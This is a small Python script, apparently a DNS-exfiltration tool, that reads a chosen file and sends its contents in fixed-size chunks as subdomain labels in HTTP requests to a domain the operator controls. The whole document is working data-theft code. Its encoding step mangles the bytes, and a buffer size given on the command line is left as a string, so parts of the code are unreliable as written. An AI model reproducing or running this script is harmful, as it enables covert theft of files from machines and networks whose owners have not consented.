import requests
import argparse
from pyfiglet import Figlet

#figlet opening
fig = Figlet(font='slant')
print(fig.renderText('SMUGGLE-WITH      D___N___S'))

#get args
parser = argparse.ArgumentParser(description='specify a file and domain')
parser.add_argument('--file', required=True ,help="path of the file")
parser.add_argument('--domain', required=True ,help="domain without subdomain")
parser.add_argument('--buffer',help="specify a buffer, default 16",default=16)
args = parser.parse_args()

#args to variables
BUF_SIZE = args.buffer
path = args.file
domain = args.domain

#open filestream
f = open(path, "rb")

#parse file
data = f.read() 
data = str(data).replace("\\x","")
data = data.replace("\\","")
data = data[2:len(data)-1]

#start dns exfliration
while data!="":
    buf = data[0:BUF_SIZE]
    data = data[BUF_SIZE:]
    try:
        r = requests.get("http://" + buf + "." + domain)
    except:
        continue

print("DONE")
